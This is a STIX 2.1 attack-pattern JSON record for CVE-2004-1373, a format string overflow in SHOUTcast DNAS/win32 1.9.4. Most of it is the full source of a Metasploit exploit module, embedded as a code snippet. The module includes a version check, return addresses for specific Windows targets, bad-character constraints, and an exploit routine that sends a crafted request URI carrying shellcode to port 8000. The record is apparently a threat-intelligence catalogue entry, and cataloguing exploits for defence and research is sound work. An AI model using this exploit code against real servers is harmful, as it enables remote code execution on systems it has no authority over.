{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e7237089-ffa3-4635-81d5-2c9d58989634",
    "created": "2024-08-14T16:53:07.623642Z",
    "modified": "2024-08-14T16:53:07.623646Z",
    "name": "SHOUTcast DNAS/win32 1.9.4 File Request Format String Overflow",
    "description": " This module exploits a format string vulnerability in the Nullsoft SHOUTcast server for Windows. The vulnerability is triggered by requesting a file path that contains format string specifiers. This vulnerability was discovered by Tomasz Trojanowski and Damian Put. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/shoutcast_format.rb",
            "external_id": "shoutcast_format.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-1373"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'SHOUTcast DNAS/win32 1.9.4 File Request Format String Overflow',\n      'Description'    => %q{\n          This module exploits a format string vulnerability in the\n        Nullsoft SHOUTcast server for Windows. The vulnerability is\n        triggered by requesting a file path that contains format\n        string specifiers. This vulnerability was discovered by\n        Tomasz Trojanowski and Damian Put.\n      },\n      'Author'         => [ 'MC', 'mandragore[at]gmail.com'],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2004-1373'],\n          [ 'OSVDB', '12585'],\n          [ 'BID', '12096'],\n        ],\n      'Privileged'     => false,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 250,\n          'BadChars' => \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Windows NT SP5/SP6a English',    { 'Ret' => 0x776a1799 }], # ws2help.dll\n          ['Windows 2000 English ALL',       { 'Ret' => 0x75022ac4 }], # ws2help.dll\n          ['Windows XP Pro SP0/SP1 English', { 'Ret' => 0x71aa32ad }], # ws2help.dll\n          ['Windows 2003 Server English',    { 'Ret' => 0x7ffc0638 }], # PEB return\n        ],\n      'DisclosureDate' => '2004-12-23'))\n\n    register_options(\n      [\n        Opt::RPORT(8000)\n      ])\n  end\n\n  def check\n    r = send_request_raw({\n      'uri' => uri\n    }, 5)\n\n    return Exploit::CheckCode::Safe if not r\n\n    m = r.body.match(/Network Audio Server\\/([^\\s]+)\\s+([^<]+)<BR/)\n    return Exploit::CheckCode::Safe if not m\n\n    vprint_status(\"This system is running SHOUTcast #{m[1]} on #{m[2]}\")\n\n    # SHOUTcast Distributed Network Audio Server/win32 v1.9.2<BR>\n    if (m[1] =~ /v1\\.([0-8]\\.|9\\.[0-3])$/)\n      if (m[2] == \"win32\")\n        return Exploit::CheckCode::Appears\n      else\n        return Exploit::CheckCode::Detected\n      end\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n\n    num = 1046 - payload.encoded.length\n    uri = '/content/%#0' + num.to_s + 'x' + payload.encoded\n    uri << \"\\xeb\\x06\" + rand_text_alphanumeric(2)\n    uri << [target.ret].pack('V')\n    uri << \"\\xe9\\x2d\\xff\\xff\\xff\"\n    uri << '#0100x.mp3'\n\n    print_status(\"Trying to exploit target #{target.name} 0x%.8x\" % target.ret)\n    send_request_raw({\n      'uri' => uri\n    }, 5)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-12-23",
    "x_mitre_platforms": [
        "win'"
    ]
}